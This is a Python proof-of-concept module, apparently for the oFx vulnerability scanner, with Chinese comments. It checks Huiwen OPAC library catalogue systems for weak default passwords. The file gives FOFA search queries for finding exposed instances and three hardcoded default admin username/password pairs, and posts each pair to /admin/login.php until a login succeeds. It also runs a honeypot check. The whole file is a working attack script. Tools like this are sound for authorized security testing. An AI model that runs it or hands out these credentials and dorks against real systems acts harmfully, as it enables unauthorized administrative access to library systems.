# coding:utf-8  
import requests
from lib.core.common import url_handle,get_random_ua
from lib.core.poc import POCBase
# ...
import urllib3
urllib3.disable_warnings()

class POC(POCBase):

    _info = {
        "author" : "jijue",                      # POC作者
        "version" : "2",                    # POC版本，默认是1  
        "CreateDate" : "2021-06-09",        # POC创建时间
        "UpdateDate" : "2021-06-09",        # POC创建时间
        "PocDesc" : """
            v1:当前版本仅针对该漏洞有效，并没有加入对全量POC扫描场景的考量，后续仍会改进   
            v2:上一版的逻辑质量有点低，感谢huangstts同学的指正，这一版相对来说会好很多，如果还有其他不足（漏报和误报），希望能得到小伙伴们的指点
        """,                                # POC描述，写更新描述，没有就不写

        "name" : "汇文OPAC弱口令",                        # 漏洞名称
        "VulnID" : "oFx-2021-0001",                      # 漏洞编号，以CVE为主，若无CVE，使用CNVD，若无CNVD，留空即可
        "AppName" : "汇文OPAC",                     # 漏洞应用名称
        "AppVersion" : "",                  # 漏洞应用版本
        "VulnDate" : "2021-06-09",                    # 漏洞公开的时间,不知道就写今天，格式：xxxx-xx-xx
        "VulnDesc" : """
            
        """,                                # 漏洞简要描述

        "fofa-dork":"""
            app="汇文软件-书目检索系统"
            app="汇文-libsys图书管理系统"
        """,                     # fofa搜索语句
        "example" : "",                     # 存在漏洞的演示url，写一个就可以了
        "exp_img" : "",                      # 先不管  
    }

    def _verify(self):
        """
        返回vuln

        存在漏洞：vuln = [True,html_source] # html_source就是页面源码  

        不存在漏洞：vuln = [False,""]
        """
        vuln = [False,""]
        url = self.target + "/admin/login.php" # url自己按需调整
        
        flag0 = "<form method=\"post\" action=\"\" id=\"f\""

        headers = {"User-Agent":get_random_ua(),
                    "Connection":"close",
                    "Content-Type": "application/x-www-form-urlencoded",
                    }
        
        data0 = "username=opac_admin&passwd=huiwen_opac"  # 系统管理员
        data1 = "username=view_admin&passwd=huiwen_opac"  # 书评管理员
        data2 = "username=map_admin&passwd=huiwen_opac"  # 地图管理员
        try:
            """
            检测逻辑，漏洞存在则修改vuln值为True，漏洞不存在则不动
            """
            req0 = requests.post(url,data=data0,headers = headers , proxies = self.proxy ,timeout = self.timeout,verify = False)
            if req0.status_code == 200 and \
                "MARC" in req0.text and \
                    "<a href=\"logout.php\">" in req0.text:
                vuln = [True,"<html><title>opac_admin::huiwen_opac</title></html>"]
            else:
                req1 = requests.post(url,data=data1,headers = headers , proxies = self.proxy ,timeout = self.timeout,verify = False)
                if req1.status_code == 200 and \
                    "<a href=\"logout.php\">" in req1.text and \
                        "<INPUT type=\"submit\" name=\"sub_del\"  value=\"" in req1.text and \
                            "<INPUT type=\"submit\" name=\"sub_audit\"  value=\"" in req1.text:
                    vuln = [True,"<html><title>view_admin::huiwen_opac</title></html>"]
                else:
                    req2 = requests.post(url,data=data2,headers = headers , proxies = self.proxy ,timeout = self.timeout,verify = False)
                    if req2.status_code == 200 and \
                        "<a href=\"logout.php\">" in req2.text and \
                            "<h2 class=\"fl\">" in req2.text and \
                                "<span class=\"orange\">" in req2.text:
                        vuln = [True,"<html><title>map_admin::huiwen_opac</title></html>"]

        except Exception as e:
            raise e
        
        # 以下逻辑酌情使用
        if self._honeypot_check(vuln[1]) == True:
            vuln[0] = False
        
        return vuln

    def _attack(self):
        return self._verify()